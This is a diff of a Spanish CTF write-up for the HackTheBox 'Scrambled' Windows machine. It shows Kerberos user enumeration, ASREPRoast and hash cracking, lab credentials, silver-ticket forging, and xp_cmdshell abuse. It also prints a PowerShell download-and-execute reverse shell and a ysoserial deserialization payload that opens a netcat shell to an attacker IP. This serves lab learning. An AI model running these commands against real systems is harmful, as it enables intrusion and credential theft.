@@ -6,10 +6,10 @@ image       : /assets/images/HTB/Scrambled-HackTheBox/Scrambled.webp
 optimized_image : /assets/images/HTB/Scrambled-HackTheBox/Scrambled.webp
 category    : [ htb ]
 tags        : [ Windows ]
-description : Máquina Windows de nivel MEDIO bastante compleja, tendremos que enumerar utilizando una gran cantidad de herramientas Impacket. Habilitaremos _xp_cmdshell en la base de datos sql para ejecutar comandos y obtener una shell inversa. Nos migraremos a otro usuario tars encontrar credenciales en la base de datos y escalaremos privilegios a través de una deserialización .NET usando la herramienta `ysoserial`
+description : Máquina Windows de nivel MEDIO bastante compleja, tendremos que enumerar utilizando una gran cantidad de herramientas Impacket. Habilitaremos _xp_cmdshell en la base de datos sql para ejecutar comandos y obtener una shell inversa. Nos migraremos a otro usuario tars encontrar credenciales en la base de datos y escalaremos privilegios a través de una deserialización .NET usando la herramienta ysoserial
 ---
 
-Máquina Windows de nivel MEDIO bastante compleja, tendremos que enumerar utilizando una gran cantidad de herramientas Impacket. Habilitaremos _xp_cmdshell en la base de datos sql para ejecutar comandos y obtener una shell inversa. Nos migraremos a otro usuario tars encontrar credenciales en la base de datos y escalaremos privilegios a través de una deserialización .NET usando la herramienta `ysoserial`
+Máquina Windows de nivel MEDIO bastante compleja, tendremos que enumerar utilizando una gran cantidad de herramientas Impacket. Habilitaremos _xp_cmdshell en la base de datos sql para ejecutar comandos y obtener una shell inversa. Nos migraremos a otro usuario tars encontrar credenciales en la base de datos y escalaremos privilegios a través de una deserialización .NET usando la herramienta ysoserial
 
 ![](/assets/images/HTB/Scrambled-HackTheBox/scrambled2.webp)
 
@@ -41,8 +41,6 @@ Máquina Windows de nivel MEDIO bastante compleja, tendremos que enumerar utiliz
 
 
 # Reconocimiento [#](reconocimiento) {#reconocimiento}
-
-***
 
 ## Reconocimiento de Puertos [🔍](#recon-nmap) {#recon-nmap}
 
@@ -201,19 +199,17 @@ Tenemos cositas interesantes...
 | 1433   | ms-sql-s | Microsoft SQL Server 2019 |
 | 4411   | ¿SERVIDOR WEB? | SCRAMBLECORP |
 
-> Dominio scrm.local y dc1.scrm.local que nos dice que estamos ante un DC.
+> Dominio scrm.local y dc1.scrm.local.
 
 Lo añadimos al etc/hosts.
 
 # Enumeración [#](enumeración) {#enumeración}
 
-***
-
 ## Enumeración SMB [🔢](#enum-smb) {#enum-smb}
 
 Para comenzar lanzo crackmapexec para enumerar un poco el SMB y saber a que me enfrento.
 
-```smb
+```bash
 ❯ crackmapexec smb 10.10.11.168
 SMB         10.10.11.168    445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:False)
 ```
@@ -222,7 +218,7 @@ No nos detecta ni el nombre, ni el dominio, el SMB esta firmado... pero no detec
 
 Asique voy a probar a listar recursos con smbclient usando una null session ya que no dispongo de credenciales.
 
-```SMB
+```bash
 ❯ smbclient -L 10.10.11.168 -N
 session setup failed: NT_STATUS_NOT_SUPPORTED
 ```
@@ -238,8 +234,6 @@ A continuación, ya que no puedo enumerar smb ni tengo ningún hilo del que tira
 
 # Kerberos [#](kerberos) {#kerberos}
 
-***
-
 ## Enumeración Usuarios [🕵️‍♂️](#enum-usuarios) {#enum-usuarios}
 
 Con la herramienta kerbrute puedo tratar de buscar usuarios válidos usando una lista de palabras.
@@ -252,15 +246,17 @@ A través de kerbrute enumeramos usuarios.
 
 ![](/assets/images/HTB/Scrambled-HackTheBox/kerbrute.webp)
 
-❯ ./kerbrute userenum -d scrm.local --dc 10.10.11.168 /opt/kerberos_enum_userlists/A-ZSurnames.txt
+```bash
+./kerbrute userenum -d scrm.local --dc 10.10.11.168 /opt/kerberos_enum_userlists/A-ZSurnames.txt
+```
 
 | Parámetro | Descripción| 
 | :-------- | :------- | 
-|-d         | Dominio  |        
+| -d        | Dominio  |        
 | -dc-ip    | ip del dc|   
-|/opt/kerberos_enum_userlists/A-ZSurnames.txt | ruta del diccionario de usuarios |
+| /A-ZSurnames.txt | ruta del diccionario de usuarios |
 
-Obtenemos varios usuarios, por lo tanto teniendo usuarios podríamos desplegar el ataque ASREPRoast para intentar conseguir el hash NTLM de alguno de los usuarios, asique me copio los usuarios en un archivo de texto antes de proceder al ataque ASREPRoast.
+Obtenemos varios usuarios, por lo tanto teniendo usuarios podríamos desplegar el ataque `ASREPRoast` para intentar conseguir el hash NTLM de alguno de los usuarios, asique me copio los usuarios en un archivo de texto antes de proceder al ataque.
 
 ![](/assets/images/HTB/Scrambled-HackTheBox/users.webp)
 
@@ -268,7 +264,9 @@ Y lanzamos el ataque ASREPRoast con la utilidad GETNPUsers.py de la suite Impack
 
 ![](/assets/images/HTB/Scrambled-HackTheBox/ASREPRoast.webp)
 
-> `python3 GetNPUsers.py -usersfile /home/elc4br4/HTB/Scramble/users -dc-ip 10.10.11.168 scrm.local/`
+```bash
+python3 GetNPUsers.py -usersfile /home/elc4br4/HTB/Scramble/users -dc-ip 10.10.11.168 scrm.local/
+```
 
 | Parámetro | Descripción| 
 | :-------- | :------- | 
@@ -287,9 +285,11 @@ Voy probando con cada uno de los usuarios y encuentro lo siguiente:
 
 ![](/assets/images/HTB/Scrambled-HackTheBox/kerbrute2.webp)
 
-> ./kerbrute bruteuser --dc 10.10.11.168 -d scrm.local ./users ksimpson
+```bash
+./kerbrute bruteuser --dc 10.10.11.168 -d scrm.local ./users ksimpson
+```
 
-Tenemos una contraseña válida ksimpson:ksimpson 
+Tenemos una contraseña válida `ksimpson:ksimpson`
 
 LLegados a este punto que ya tenemos credenciales válidas podríamos intentar solicitar un ticket (TGT - Ticket Granting Ticket) para poder autenticarnos por Kerberos.
 
@@ -319,13 +319,13 @@ De esta forma podemos copiarnos el hash e intentar crackearlo con john o hashcat
 
 Yo lo crackearé con hashcat.
 
-> hahcat -m 13100 -a 0 hash /usr/share/wordlists/rockyou.txt
+> `hashcat -m 13100 -a 0 hash /usr/share/wordlists/rockyou.txt`
 
 ![](/assets/images/HTB/Scrambled-HackTheBox/hashcat.webp)
 
 Recopilo los datos que tenemos de momento.
 
-> ksimpson:ksimpson
+> ksimpson:ksimpson //
 > sqlsvc:Pegasus60
 
 Intento loguearme en el servidor sql a través de la herramienta mssqlclient.py generando un hash NTLM a partir de la contraseña encontrada.
@@ -353,7 +353,9 @@ Para conseguir el domain sid del dominio puedo usar la herramienta secretsdump d
 Ahora que ya tenemos el SID del dominio podemos intentar obtener 
 el ticket.
 
-`impacket-ticketer -domain scrm.local -spn MSSQLSVC/dc1.scrm local -user-id 500 Administrator -nthash¿? -domain-sid ¿?`
+```bash
+impacket-ticketer -domain scrm.local -spn MSSQLSVC/dc1.scrm local -user-id 500 Administrator -nthash¿? -domain-sid ¿?
+```
 
 ![](/assets/images/HTB/Scrambled-HackTheBox/ticket.webp)
 
@@ -368,7 +370,7 @@ Y ya estamos autenticados en el servidor SQL.
 
 Pruebo a inspeccionar que hay dentro de la base de datos.
 
-> Listamos las bases de datos
+1. Listamos las bases de datos
 
 `select name from master.sys.databses`
 
@@ -378,13 +380,13 @@ Vemos que una de las bases de datos se llama ScrambleHR, es la más llamativa de
 
 `use ScrambledHR`
 
-> Listamos las tablas que hay dentro de la base de datos ScrambleHR
+2. Listamos las tablas que hay dentro de la base de datos ScrambleHR
 
 `select name from information_schema.tables`
 
 ![](/assets/images/HTB/Scrambled-HackTheBox/sqlcommands2.webp)
 
-> Listamos el contenido de la tabla UserImport
+3. Listamos el contenido de la tabla UserImport
 
 `SELECT * from UserImport`
 
@@ -392,7 +394,9 @@ Vemos que una de las bases de datos se llama ScrambleHR, es la más llamativa de
 
 Y encuentro el usuario miscsvc y la contraseña ScrambledEggs9900
 
-Peroa demás de eso, después de obtener las credenciales lanzo el comando help para ver que utilidades hay en la base de datos y encuentro algo que me alegra el día por completo!!!
+> miscsvc:ScrambledEggs9900
+
+Pero además de eso, después de obtener las credenciales lanzo el comando help para ver que utilidades hay en la base de datos y encuentro algo que me alegra el día por completo!!!
 
 ![](/assets/images/HTB/Scrambled-HackTheBox/sql1.webp)
 
@@ -416,7 +420,7 @@ Como podemos ver nos ejecuta el comando y nos devuelve la salida al mismo, asiqu
 
 ## Reverse Shell  [🔄](#rev-shell) {#rev-shell}
 
-> Lo primero será subir el netcat a la máquina vícitma.
+1. Lo primero será subir el netcat a la máquina vícitma.
 
 Abro un servidor python3 en mi máquina.
 
@@ -428,9 +432,9 @@ Y desde el servidor sql ejecuto el siguiente comandopara descargar el netcat.
 
 ![](/assets/images/HTB/Scrambled-HackTheBox/sql4.webp)
 
-> A continuación pongo un oyente de netcat en escucha en el puerto 443.
+2. A continuación pongo un oyente de netcat en escucha en el puerto 443.
 
-> Y lanzo el siguiente comando para eejcutar la rev shell desde el servidor sql usando el nc.exe 
+3. Y lanzo el siguiente comando para eejcutar la rev shell desde el servidor sql usando el nc.exe 
 
 En mi máquina atacante:
 
@@ -450,17 +454,21 @@ Intento leer la flag user.txt pero no puedo, porque estoy logueado como el usuar
 
 Asique me toca migrarme al usuario miscsvc.
 
-# Escalada de Privilegios Horizontal - Usuario miscsvc [#](privesc) {#privesc}
+# Movimiento Lateral - Usuario miscsvc [#](privesc) {#privesc}
 
 Usando las credenciales obtenidas intentaré convertirme en el usuario miscsvc.
 
-Podría crear unas credenciales en Pòwershell y después intentar lanzar una rev shell.
+Podría crear unas credenciales en Powershell y después intentar lanzar una reverse shell:
 
-> Creo las credenciales
+Creo las credenciales
 
-`$password = ConvertTo-SecureString "ScrambledEggs9900" -AsPlainText -Force`
+```powershell
+$password = ConvertTo-SecureString "ScrambledEggs9900" -AsPlainText -Force
+```
 
-`$creds = New-Object System.Management.Automation.PSCredential("scrm\miscsvc", $password)`
+```powershell
+$creds = New-Object System.Management.Automation.PSCredential("scrm\miscsvc", $password)
+```
 
 ![](/assets/images/HTB/Scrambled-HackTheBox/credenciales.webp)
 
@@ -478,7 +486,9 @@ Una vez editada lanzamos el comando:
 
 [https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
 
-`Invoke-Command -Computer dc1 -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2:8080/Invoke-PowerShellTcp.ps1') } -Credential $creds`
+```powershell
+Invoke-Command -Computer dc1 -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2:8080/Invoke-PowerShellTcp.ps1') } -Credential $creds
+```
 
 ![](/assets/images/HTB/Scrambled-HackTheBox/miscsvc.webp)
 
@@ -492,15 +502,15 @@ Continuo enumerando un poco la máquina y encuentro un par de recursos compartid
 
 Asique uso la utilidad smbclient para descargar estos dos archivos y posteriormente analizar el .exe con dnSpy.
 
-Pero en esta ocasión antes de nada, voy a tener que compartir la VPN de HTB con el sistema Windows para poder continuar, a través de la técnica **`IP FORWARDING`**
+Pero en esta ocasión antes de nada, voy a tener que compartir la VPN de HTB con el sistema Windows para poder continuar, a través de la técnica `IP FORWARDING`
 
 # IP FORWARDING [#](ipforwarding) {#ipforwarding}
 
 ```bash
-# ip máquina atacante Linux --> 192.168.213.128 NAT
+ip máquina atacante Linux --> 192.168.213.128 NAT
 -------------------------------------------------
 -------------------------------------------------
-# ip máquina Windows --> 192.168.213.131 NAT
+ip máquina Windows --> 192.168.213.131 NAT
 ```
 
 Una vez tenemos las ip´s de las máquinas ejecutamos los siguientes comandos:
@@ -520,9 +530,7 @@ Una vez realizamos los pasos hacemos ping desde Windows a la máquina víctima 1
 
 ![](/assets/images/HTB/Scrambled-HackTheBox/ping.webp)
 
-# Escalada de Privilegios Vertical - Usuario Administrador [#](privesc2) {#privesc2}
-
-***
+# Escalada de Privilegios - Usuario Administrador [#](privesc2) {#privesc2}
 
 ## ScrambleClient.exe [💻](#scramabled) {#scrambled}
 
@@ -581,7 +589,9 @@ Para poder realizar este payload serializado usaré la herramienta ysoserial.net
 
 Una vez descargada, desde powershell o cmd la ejecutaremos para serializar el payload con el siguiente comando.
 
-> C:\Users\W10_CFC\Desktop\Release> <span style="color:red"> ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "C:\Temp\netcat.exe -e powershell 10.10.14.4 443" </span>. 
+```powershell
+C:\Users\W10_CFC\Desktop\Release> ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "C:\Temp\netcat.exe -e powershell 10.10.14.4 443"
+```
 
 Y se nos generará serializado.
 
@@ -595,7 +605,7 @@ En otra ventana en el cmd nos podemos en escucha en el puerto 4411 que es donde 
 
 Debemos añadir delante de la data: <span style="color:red">UPLOAD_ORDER;dataserializada</span>.
 
-```cmd
+```powershell
 # DATA SERIALIZADA
 ------------------
 C:\Users\W10_CFC\Desktop>nc.exe 10.10.11.168 4411
@@ -613,7 +623,7 @@ Y ya podemos leer la flag root.txt
 
 ![](/assets/images/HTB/Scrambled-HackTheBox/root.webp)
 
-<span style="color:Red">PWNED!!!</span>
+<span style="color:Red"> MÁQUINA PWNEADA!!!</span>
 
 ![](/assets/images/HTB/Scrambled-HackTheBox/pwned.webp)
 
